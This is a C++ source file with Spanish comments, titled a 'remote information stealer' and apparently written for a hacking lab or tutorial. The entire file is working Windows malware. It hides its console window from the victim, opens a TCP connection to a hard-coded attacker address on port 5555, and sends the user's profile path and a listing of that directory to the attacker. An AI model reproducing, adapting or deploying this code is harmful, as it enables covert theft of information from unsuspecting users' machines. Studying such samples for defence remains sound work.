// REMOTE INFORMATION STEALER BY BOUNTYHACKERS

// Usamos las utilidades winsock y no queremos que el compilador se queje de las funcionalidades anteriores utilizadas, 
// ya que el siguiente código es suficiente para nuestras necesidades.
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib") // Necesitamos la biblioteca Ws2_32.lib para usar la funcionalidad de sockets (redes) en Windows.
#include <iostream> // incluye utilidades estándar de entrada/salida
#include <winsock2.h> // incluye utilidades de red
#include <stdio.h> // incluye utilidades estándar de entrada/salida (necesarias para perror())
#include <stdlib.h> // incluye utilidades estándar de entrada/salida
#include <dirent.h> // incluye utilidades de directorio
#include <string> // incluye utilidades de cadena

//La variable %USERPROFILE% contiene la ruta de la carpeta de perfil de usuario a la que tenemos acceso (también conocido como el usuario víctima).
char* userDirectory() {
    char* pPath;
    pPath = getenv("USERPROFILE");

    if (pPath!=NULL) {
        return pPath;
    }
    else {
        perror("");
    }
}


int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE); // ocultar la ventana del programa para que no sea obvio para la víctima que este programa se está ejecutando
    WSADATA WSAData; // este tipo de datos (es una estructura) contiene información sobre la implementación del socket de Windows.
    SOCKET server; // este tipo de datos almacena la conexión del tipo SOCKET.
    SOCKADDR_IN addr; // este tipo de datos (es una estructura) contiene los detalles de la conexión del socket.

    WSAStartup(MAKEWORD(2, 0), &WSAData); // Inicialice el uso de la biblioteca winsock (necesaria para abrir una conexión de red).
    server = socket(AF_INET, SOCK_STREAM, 0); // Configura un socket TCP. AF_INET significa familia de direcciones para IPv4. SOCK_STREAM significa que queremos un socket TCP.

    /*
    El fragmento siguiente establecería la dirección IP del objetivo al que deseamos enviar los datos (que sería la dirección IP del atacante). El puerto utilizado sería el 
    5555 y la dirección IP es IPv4 la cual viene indicada por AF_INET.
    */
    addr.sin_addr.s_addr = inet_addr("10.10.15.2"); // HERE YOU PASTE THE IP ADDRESS OF KALI MACHINE
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555);

    connect(server, (SOCKADDR *)&addr, sizeof(addr)); // Conéctese al host/puerto de destino configurado previamente.

    char* pPath = userDirectory(); // Obtenga el directorio de usuarios utilizando la función userDirectory.
    // Envía la ruta del directorio del usuario al atacante. A esto le sigue una nueva línea para que la salida recibida por el atacante tenga el formato correcto: 1 entrada por línea.
    send(server, pPath, sizeof(pPath), 0);
    send(server, "\n", 1, 0);
    
    /*
    El fragmento siguiente abre el directorio del usuario y luego lee las entradas en él. Luego, todas las entradas se envían de regreso a la máquina
    del atacante a través del socket TCP establecido. También se envía una nueva línea, de modo que la lista del directorio se muestra con una entrada 
    por línea. En caso de que no se pueda abrir el directorio, el programa mostrará el error asociado mediante la llamada a perror().
    */
    DIR *dir;
    struct dirent *ent;

    if ((dir = opendir(pPath)) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            send(server, ent->d_name, sizeof(ent->d_name), 0);
            send(server, "\n", 1, 0);
            memset(ent->d_name, 0, sizeof(ent->d_name));
        }
        closedir(dir);
    }
    else {
        perror("");
    }

    closesocket(server);
    WSACleanup();
}

